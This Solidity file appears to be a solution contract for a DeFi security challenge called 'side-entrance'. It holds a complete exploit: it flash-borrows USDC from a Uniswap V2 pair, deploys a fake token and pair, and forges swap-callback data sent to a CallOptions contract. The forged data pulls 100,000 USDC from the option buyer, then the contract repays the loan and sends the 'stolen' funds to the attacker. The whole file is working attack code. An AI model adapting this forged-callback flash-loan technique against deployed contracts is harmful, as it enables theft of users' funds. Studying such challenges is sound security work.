// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {console} from "forge-std/console.sol";

import {IUniswapV2Factory} from "@uniswap/v2-core/contracts/interfaces/IUniswapV2Factory.sol";
import {IUniswapV2Router02} from "@uniswap/v2-periphery/contracts/interfaces/IUniswapV2Router02.sol";
import {IUniswapV2Pair} from "@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import {Token} from "src/other/Token.sol";
import {CallOptions} from "src/side-entrance/CallOptions.sol";

contract SideEntranceAttack {
    IUniswapV2Factory public uniFactory;
    IUniswapV2Router02 public uniRouter;
    IUniswapV2Pair public usdcDaiPair;
    Token public usdc;
    CallOptions public optionsContract;

    /// preliminary state
    constructor(
        IUniswapV2Factory _uniFactory,
        IUniswapV2Router02 _uniRouter,
        IUniswapV2Pair _usdcDaiPair,
        Token _usdc,
        CallOptions _optionsContract
    ) {
        uniFactory = _uniFactory;
        uniRouter = _uniRouter;
        usdcDaiPair = _usdcDaiPair;
        usdc = _usdc;
        optionsContract = _optionsContract;
    }

    function attack() public {
        // flash USDC from USDC-DAI
        // we want to flash the usdcStrike (2100e18) of the already created option
        // we flash 2_101e8 - because Uniswap burns 1000 when totalSupply = 0
        usdcDaiPair.swap({amount0Out: 2_101e18, amount1Out: 0, to: address(this), data: "flash"});

        // transfer all USDC stolen to attacker
        uint256 attackerAmount = usdc.balanceOf(address(this));
        usdc.transfer({to: msg.sender, amount: attackerAmount});
    }

    function uniswapV2Call(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external {
        usdc.approve({spender: address(optionsContract), amount: type(uint256).max});

        // create a fake token and fake UniswapV2 pair USDC-FAKE
        (IERC20 fakeToken, uint256 _liquidity) = _createTokenAndUniPair();

        // get the fake uniPair
        IUniswapV2Pair fakeUniPair = IUniswapV2Pair(uniFactory.getPair(address(usdc), address(fakeToken)));

        // get latest call option id and buyer
        bytes32 _optionId = optionsContract.getLatestOptionId();
        address optionBuyer = optionsContract.getBuyer(_optionId); // optionBuyer is adminUser

        // construct fake data for flash
        bytes memory fakeData = abi.encode(_optionId, optionBuyer, 100_000e18); // steal 100_000e18 from adminUser

        uint256 _amount0Out = fakeUniPair.token0() == address(usdc) ? amount0 - 1 : 0;
        uint256 _amount1Out = fakeUniPair.token0() == address(usdc) ? 0 : amount0 - 1;

        fakeUniPair.swap({
            amount0Out: _amount0Out,
            amount1Out: _amount1Out,
            to: address(optionsContract),
            data: fakeData
        });

        fakeUniPair.approve(address(uniRouter), _liquidity);

        uniRouter.removeLiquidity({
            tokenA: address(usdc),
            tokenB: address(fakeToken),
            liquidity: _liquidity,
            amountAMin: 0,
            amountBMin: 0,
            to: address(this),
            deadline: block.timestamp
        });

        uint256 loanPlusInterest = (amount0 * (1e18) * 1000 / 997 / (1e18)) + 1;
        usdc.transfer({to: address(usdcDaiPair), amount: loanPlusInterest});

        console.log("Attacker USDC", usdc.balanceOf(address(this)));
    }

    function _createTokenAndUniPair() internal returns (IERC20, uint256) {
        // create a FAKE token
        IERC20 fakeToken = new FakeToken(2_101e18); // usdcStrike amount

        // create a fake UniswapV2 pair USDC-FAKE
        usdc.approve({spender: address(uniRouter), amount: type(uint256).max});
        fakeToken.approve({spender: address(uniRouter), amount: type(uint256).max});

        uint256 fakeTokenBalance = fakeToken.balanceOf(address(this));

        (,, uint256 liquidity) = uniRouter.addLiquidity({
            tokenA: address(usdc),
            tokenB: address(fakeToken),
            amountADesired: 2_101e18, // same as usdcStrike amount
            amountBDesired: fakeTokenBalance,
            amountAMin: 0,
            amountBMin: 0,
            to: address(this),
            deadline: block.timestamp
        });

        return (fakeToken, liquidity);
    }
}

contract FakeToken is ERC20 {
    constructor(uint256 initialSupply) ERC20("Fake", "FAKE") {
        _mint(msg.sender, initialSupply);
    }
}
